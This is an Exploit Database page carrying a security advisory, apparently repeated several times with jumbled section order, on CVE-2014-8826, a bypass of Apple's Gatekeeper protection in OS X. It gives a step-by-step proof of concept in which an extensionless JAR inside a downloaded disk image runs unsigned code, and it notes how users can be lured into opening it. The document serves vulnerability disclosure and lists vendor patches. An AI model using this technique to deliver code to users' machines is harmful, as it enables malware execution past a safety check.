Advisory URL :
http://www.ampliasecurity.com/advisories/os-x-gatekeeper-bypass-vulnerability.html

Gatekeeper is a feature available in OS X Lion v10.7.5 and later
versions of OS X.

Gatekeeper performs checks on files and applications downloaded from the
Internet to prevent execution of supposedly malicious and
untrusted/unsigned code.

Gatekeeper provides three different settings:

- Mac App Store (Only apps that came from the Mac App Store can open)
- Mac App Store and identified developers (Only apps that came from the
Mac App Store and identified developers using Gatekeeper can open)
- Anywhere

The default setting is "Mac App Store and identified developers".

This setting prevents execution of any code that was not downloaded from
the Mac App Store and that was not digitally signed by a Developer ID
registered with Apple.

For example, If the user downloads an application from an untrusted
source and double-clicks on the application to execute it, OS X
Gatekeeper will prevent its execution with the following warning message:

"<AppName> can't be opened because it is from an unidentified developer."

(For more information on OS X Gatekeeper, see
http://support.apple.com/kb/ht5290)

We found an attacker can bypass OS X Gatekeeper protections and execute
unsigned malicious code downloaded by the user, even if OS X Gatekeeper
is configured to only allow execution of applications downloaded from
the Mac App Store (the highest security setting).

The exploitation technique is trivial and requires Java to be installed
on the victim's machine.

OS X Gatekeeper prevents execution of downloaded Java Jar (.jar) and
class (.class) files, but this verification can be bypassed.

For example:

- Create a JAR file containing the code to be executed

For example,

File AmpliaTest.java:

public class AmpliaTest {
	public static void main(String[] args) {
		try { Runtime.getRuntime().exec("/usr/bin/touch /tmp/AMPLIASECURITY");
} catch(Exception e) { }
	}
}

(This is just an example, of course, arbitrary code can be executed)

$ javac AmpliaTest.java

Be sure to compile the code for a version of Java lower than or equal to
the one available on the target (for example, javac -target 1.6 -source
1.6 AmpliaTest.java; and the compiled code will work on Java versions >=
1.6) .

$ echo "main-class: AmpliaTest" > Manifest

$ jar cmf Manifest UnsignedCode.jar AmpliaTest.class

- Create a .DMG disk image

For example:

$ hdiutil create -size 5m -fs HFS+ -volname AmpliaSecurity AmpliaTest.dmg

- Mount AmpliaTest.dmg

- Rename UnsignedCode.jar to UnsignedCode (just remove the extension)

- Copy UnsignedCode to the AmpliaSecurity volume

- Unmount AmpliaTest.dmg

- Host the file AmpliaTest.dmg on a web server

- Download AmpliaTest.dmg using Safari and open it

- Double-Click on 'UnsignedCode' and the code will be executed bypassing
OS X Gatekeeper checks (the code creates the file /tmp/AMPLIASECURITY).

(Perform the same steps but without removing the .jar extension to
UnsignedCode.jar and OS X Gatekeeper will prevent execution of the Jar file)

Because the file 'UnsignedCode' has no extension, Finder will display a
blank page icon; the Java/JAR icon will not be displayed. The user does
not know he is double-clicking on a JAR file and the file does not look
particularly suspicious. Also, since the unsigned code is distributed
inside a disk image (.DMG) file, there are many things the attacker can
do to gain the trust of the user (include other files, use Finder
background images, etc).

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

**4.** Vendor Information, solutions and workarounds

**5.** Credits

**6.** Technical description

**7.** Disclaimer

### 1. Vulnerability information

**Impact**: A malicious Jar file can bypass all OS X Gatekeeper warnings and protections, allowing a remote attacker to execute arbitrary unsigned code downloaded by the user. Java must be installed on the victim's machine.

**Remotely Exploitable**: Yes

**Bugtraq Id**: <unknown>

**CVE ID**: CVE-2014-8826

### 2. Vulnerability description

Gatekeeper is a feature available in OS X Lion v10.7.5 and later versions of OS X.

Gatekeeper performs checks on files and applications downloaded from the Internet to prevent execution of supposedly malicious and untrusted/unsigned code.

Gatekeeper provides three different settings:

- Mac App Store (Only apps that came from the Mac App Store can open)

- Mac App Store and identified developers (Only apps that came from the Mac App Store and identified developers can open)

- Anywhere

The default setting is "Mac App Store and identified developers".

This setting prevents execution of any code that was not downloaded from the Mac App Store and that was not digitally signed by a Developer ID registered with Apple.

For example, If the user downloads an unsigned application from an untrusted source and double-clicks on the application to execute it, OS X Gatekeeper will prevent its execution with the following warning message:

"<AppName> can't be opened because it is from an unidentified developer."

(For more information on OS X Gatekeeper, see <https://support.apple.com/kb/ht5290>)

We found an attacker can bypass all OS X Gatekeeper warnings and protections and execute unsigned malicious code downloaded by the user, even if OS X Gatekeeper is configured to only allow execution of applications downloaded from the Mac App Store (the highest security setting).

The technique is trivial and requires Java to be installed on the victim's machine.

OS X Gatekeeper prevents execution of downloaded Java Jar (.jar) and class (.class) files, but this verification can be bypassed.

### 3. Vulnerable Systems

Succesful exploitation of this vulnerability requires Java to be installed on the target system.

This vulnerability was successfully tested on the following versions of OS X:

OS X Lion

OS X Mavericks

OS X Yosemite

According to Apple, OS X Mountain Lion v10.8.5 is also vulnerable.

All systems with OS X Gatekeeper are suspected to be vulnerable.

### 4. Vendor Information, Solutions and Workarounds

Apple security updates are available via the Software Update mechanism:

<https://support.apple.com/kb/HT1338>

Apple security updates are also available for manual download via:

[https://www.apple.com/support/downloads/The security update is available for: OS X Mountain Lion v10.8.5, OS X Mavericks v10.9.5, OS X Yosemite v10.10 and v10.10.1.

The security update is not available for OS X Lion v10.7.5 which is also vulnerable to this issue.

6. Technical Description
7. Disclaimer

1.Vulnerability Information
---------------------------

Impact: A malicious Jar file can bypass all OS X Gatekeeper warnings and
protections, allowing a remote attacker to execute arbitrary unsigned
code downloaded by the user. Java must be installed on the victim's machine.
Remotely Exploitable: Yes
Bugtraid ID: <unknown>
CVE ID: CVE-2014-8826

2.Vulnerability Description
----------------------------

Gatekeeper is a feature available in OS X Lion v10.7.5 and later
versions of OS X.

Gatekeeper performs checks on files and applications downloaded from the
Internet to prevent execution of supposedly malicious and
untrusted/unsigned code.

Gatekeeper provides three different settings:

- Mac App Store (Only apps that came from the Mac App Store can open)
- Mac App Store and identified developers (Only apps that came from the
Mac App Store and identified developers using Gatekeeper can open)
- Anywhere

The default setting is "Mac App Store and identified developers".

This setting prevents execution of any code that was not downloaded from
the Mac App Store and that was not digitally signed by a Developer ID
registered with Apple.

For example, If the user downloads an unsigned application from an
untrusted source and double-clicks on the application to execute it, OS
X Gatekeeper will prevent its execution with the following warning message:

"<AppName> can't be opened because it is from an unidentified developer."

(For more information on OS X Gatekeeper, see
<http://support.apple.com/kb/ht5290>)

We found an attacker can bypass OS X Gatekeeper protections and execute
unsigned malicious code downloaded by the user, even if OS X Gatekeeper
is configured to only allow execution of applications downloaded from
the Mac App Store (the highest security setting).

The exploitation technique is trivial and requires Java to be installed
on the victim's machine.

OS X Gatekeeper prevents execution of downloaded Java Jar (.jar) and
class (.class) files, but this verification can be bypassed.

3.Vulnerable Systems
--------------------

Successful exploitation of this vulnerability requires Java to be
installed on the target system.

This vulnerability was successfully tested on the following versions of
OS X:

OS X Lion
OS X Mavericks
OS X Yosemite

According to Apple, OS X Mountain Lion v10.8.5 is also vulnerable.

All systems with OS X Gatekeeper are suspected to be vulnerable.

4.Vendor Information, Solutions and Workarounds
-----------------------------------------------

Apple security updates are available via the Software Update mechanism:
   <http://support.apple.com/kb/HT1338>

Apple security updates are also available for manual download via:
   <http://www.apple.com/support/downloads/>

The security update is available for: OS X Mountain Lion v10.8.5, OS X
Mavericks v10.9.5, OS X Yosemite v10.10 and v10.10.1.

The security update is not available for OS X Lion v10.7.5 which is also
vulnerable to this issue.

For more information see <http://support.apple.com/kb/HT1222>

This vulnerability was discovered by Hernan Ochoa from Amplia Security.

6. Technical Description
------------------------

Gatekeeper is a feature available in OS X Lion v10.7.5 and later
versions of OS X.

Gatekeeper performs checks on files and applications downloaded from the
Internet to prevent execution of supposedly malicious and
untrusted/unsigned code.

Gatekeeper provides three different settings:

- Mac App Store (Only apps that came from the Mac App Store can open)
- Mac App Store and identified developers (Only apps that came from the
Mac App Store and identified developers using Gatekeeper can open)
- Anywhere

The default setting is "Mac App Store and identified developers".

This setting prevents execution of any code that was not downloaded from
the Mac App Store and that was not digitally signed by a Developer ID
registered with Apple.

For example, If the user downloads an application from an untrusted
source and double-clicks on the application to execute it, OS X
Gatekeeper will prevent its execution with the following warning message:

"<AppName> can't be opened because it is from an unidentified developer."

(For more information on OS X Gatekeeper, see
<http://support.apple.com/kb/ht5290>)

We found an attacker can bypass OS X Gatekeeper protections and execute
unsigned malicious code downloaded by the user, even if OS X Gatekeeper
is configured to only allow execution of applications downloaded from
the Mac App Store (the highest security setting).

The exploitation technique is trivial and requires Java to be installed
on the victim's machine.

OS X Gatekeeper prevents execution of downloaded Java Jar (.jar) and
class (.class) files, but this verification can be bypassed.

For example:

- Create a JAR file containing the code to be executed

For example,

File AmpliaTest.java:

public class AmpliaTest {
        public static void main(String[] args) {
                try { Runtime.getRuntime().exec("/usr/bin/touch /tmp/AMPLIASECURITY");
} catch(Exception e) { }
        }
}

(This is just an example, of course, arbitrary code can be executed)

$ javac AmpliaTest.java

Be sure to compile the code for a version of Java lower than or equal to
the one available on the target (for example, javac -target 1.6 -source
1.6 AmpliaTest.java; and the compiled code will work on Java versions >=
1.6) .

$ echo "main-class: AmpliaTest" > Manifest

$ jar cmf Manifest UnsignedCode.jar AmpliaTest.class

- Create a .DMG disk image

For example:

$ hdiutil create -size 5m -fs HFS+ -volname AmpliaSecurity AmpliaTest.dmg

- Mount AmpliaTest.dmg

- Rename UnsignedCode.jar to UnsignedCode (just remove the extension)

- Copy UnsignedCode to the AmpliaSecurity volume

- Unmount AmpliaTest.dmg

- Host the file AmpliaTest.dmg on a web server

- Download AmpliaTest.dmg using Safari and open it

- Double-Click on 'UnsignedCode' and the code will be executed bypassing
OS X Gatekeeper checks (the code creates the file /tmp/AMPLIASECURITY).

(Perform the same steps but without removing the .jar extension to
UnsignedCode.jar and OS X Gatekeeper will prevent execution of the Jar file)

Because the file 'UnsignedCode' has no extension, Finder will display a
blank page icon; the Java/JAR icon will not be displayed. The user does
not know he is double-clicking on a JAR file and the file does not look
particularly suspicious. Also, since the unsigned code is distributed
inside a disk image (.DMG) file, there are many things the attacker can
do to gain the trust of the user (include other files, use Finder
background images, etc).

Distribution of applications in .DMG files is common. Apple even
distributes security patches using .DMG files.

There are other attack scenarios.
